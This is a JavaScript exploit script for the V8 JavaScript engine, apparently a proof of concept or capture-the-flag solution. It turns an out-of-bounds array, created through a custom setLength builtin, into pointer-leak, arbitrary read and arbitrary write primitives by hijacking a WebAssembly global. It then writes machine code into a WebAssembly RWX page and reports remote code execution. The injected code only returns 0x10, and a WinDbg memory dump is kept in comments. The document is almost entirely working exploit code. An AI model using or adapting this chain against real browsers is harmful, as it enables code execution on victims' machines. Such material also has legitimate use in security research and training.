function log(_str) {
	print(`${_str}`);
}

function dp(_obj) {
	%DebugPrint(_obj);
}

const __buf = new ArrayBuffer(8); // 8 byte array buffer
const __f64_buf = new Float64Array(__buf);
const __u32_buf = new Uint32Array(__buf);

function ftoi(val) { // typeof(val) = float
    __f64_buf[0] = val;
    return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    __u32_buf[0] = Number(val & 0xffffffffn);
    __u32_buf[1] = Number(val >> 32n);
    return __f64_buf[0];
}

let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,12,3,96,0,1,126,96,0,0,96,1,126,0,2,14,1,2,106,115,6,103,108,111,98,97,108,3,126,1,3,4,3,0,1,2,7,37,3,9,103,101,116,71,108,111,98,97,108,0,0,9,105,110,99,71,108,111,98,97,108,0,1,9,115,101,116,71,108,111,98,97,108,0,2,10,23,3,4,0,35,0,11,9,0,35,0,66,1,124,36,0,11,6,0,32,0,36,0,11])

var global = new WebAssembly.Global({value:'i64', mutable:true}, 0n);
//var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 3, 96, 0, 1, 126, 96, 0, 0, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 4, 3, 0, 1, 2, 7, 37, 3, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99, 71, 108, 111, 98, 97, 108, 0, 1, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 2, 10, 23, 3, 4, 0, 35, 0, 11, 9, 0, 35, 0, 66, 1, 124, 36, 0, 11, 6, 0, 32, 0, 36, 0, 11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod, {js: {global}});

let oob_array = [1.1, 1.2, 1.3, 1.4]
let object_array = [{}, {}, {}, {}]
let float_array = [2.1, 2.2, 2.3, 2.4]

oob_array.setLength(0x100)
// dp(oob_array)
// dp(object_array)

var ab = new ArrayBuffer(0x100)
var wr = new BigUint64Array(ab)
// dp(wr)

/*
0:011> dqs 0x01f108108e99-1+8 L30
000001f1`08108ea0  3ff19999`9999999a
000001f1`08108ea8  3ff33333`33333333
000001f1`08108eb0  3ff4cccc`cccccccd
000001f1`08108eb8  3ff66666`66666666
000001f1`08108ec0  08002249`082c3af9
000001f1`08108ec8  00000200`08108e99
000001f1`08108ed0  00000008`08002221
000001f1`08108ed8  08108f05`08108ee9
000001f1`08108ee0  08108f3d`08108f21
000001f1`08108ee8  08002249`082c22e9
000001f1`08108ef0  080023d1`08002249
000001f1`08108ef8  080023d1`080023d1
000001f1`08108f00  082c22e9`080023d1
000001f1`08108f08  08002249`08002249
000001f1`08108f10  080023d1`080023d1
000001f1`08108f18  080023d1`080023d1
000001f1`08108f20  08002249`082c22e9
000001f1`08108f28  080023d1`08002249
000001f1`08108f30  080023d1`080023d1
000001f1`08108f38  082c22e9`080023d1
000001f1`08108f40  08002249`08002249
000001f1`08108f48  080023d1`080023d1
000001f1`08108f50  080023d1`080023d1
000001f1`08108f58  08002249`082c3b49
000001f1`08108f60  00000008`08108ed1
000001f1`08108f68  00000008`08002ab1
000001f1`08108f70  4000cccc`cccccccd
000001f1`08108f78  40019999`9999999a
000001f1`08108f80  40026666`66666666
000001f1`08108f88  40033333`33333333
000001f1`08108f90  08002249`082c3af9
000001f1`08108f98  00000008`08108f69
000001f1`08108fa0  08002249`082c3289
000001f1`08108fa8  00000100`08002249
000001f1`08108fb0  00000100`00000000
000001f1`08108fb8  00000000`00000000
000001f1`08108fc0  332a9350`01000300
000001f1`08108fc8  00000002`000001e8
000001f1`08108fd0  00000000`00000000
000001f1`08108fd8  00000000`00000000
000001f1`08108fe0  08002249`082c24f1
000001f1`08108fe8  08108fa1`080033a1
000001f1`08108ff0  00000000`00000000
000001f1`08108ff8  00000000`00000100
000001f1`08109000  00000100`080023d0
000001f1`08109008  00000000`00000000
000001f1`08109010  00000000`01000300
000001f1`08109018  00000000`00000000
*/

oob_array[46] = itof(0n)

function compressedRead(_address) {
    let finalAddress = _address << 32n
    oob_array[46] = itof(finalAddress)
    return wr[0]
}

function compressedWrite(_address, _value) {
    let finalAddress = BigInt(_address) << 32n
    oob_array[46] = itof(finalAddress)
    wr[0] = _value
}

function compressedAddrOf(_object) {
    object_array[0] = _object
    object_array[1] = _object
    object_array[2] = _object
    object_array[3] = _object
    return ftoi(oob_array[8]) & 0xffffffffn
}

// console.log(compressedRead(0x00040020n).toString(16))
let js_heap_base = compressedRead(0x00040020n) & 0xffffff00000000n
//dp([])
console.log(`[+] V8 Heap Base: 0x${js_heap_base.toString(16)}`)

let float_array_pointer = compressedAddrOf(float_array)
let float_array_length_and_elements_pointer_address = float_array_pointer-1n+0x8n
let float_array_length_and_elements_pointer = compressedRead(float_array_length_and_elements_pointer_address)
let float_array_first_element_pointer = (float_array_length_and_elements_pointer - 1n + 8n) & 0xffffffffn
//console.log(compressedRead(float_array_first_element_pointer).toString(16))

let wasm_instance_pointer = compressedAddrOf(wasm_instance)
let imported_mutable_globals_pointer = wasm_instance_pointer-1n+0x50n
//console.log(compressedRead(imported_mutable_globals_pointer).toString(16))

compressedWrite(imported_mutable_globals_pointer, js_heap_base + float_array_first_element_pointer)

function arbRead(_address) {
    float_array[0] = itof(_address)
    return wasm_instance.exports.getGlobal()
}

function arbWrite(_address, _value) {
    float_array[0] = itof(_address)
    return wasm_instance.exports.setGlobal(_value)
}

console.log(`[+] Testing Arb Read ${arbRead(js_heap_base+float_array_first_element_pointer+8n).toString(16)}`)
console.log(`[+] Testing Arb Write`) ; arbWrite(js_heap_base+float_array_first_element_pointer+8n, 0x4141414141414141n)
console.log(`[+] Testing Arb Read ${arbRead(js_heap_base+float_array_first_element_pointer+8n).toString(16)}`)

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var wasmInstanceAddress = compressedAddrOf(wasmInstance)-1n+0x60n
var rwx = compressedRead(wasmInstanceAddress)
console.log(`[+] RWX ${rwx.toString(16)}`)

// 48 c7 c0 10 00 00 00 c3                      
arbWrite(rwx, 0xc300000010c0c748n)
console.log(`[+] RET ${func().toString(16)} (If you see 0x10, we have achieved RCE - just return 0x10 as a PoC)`)
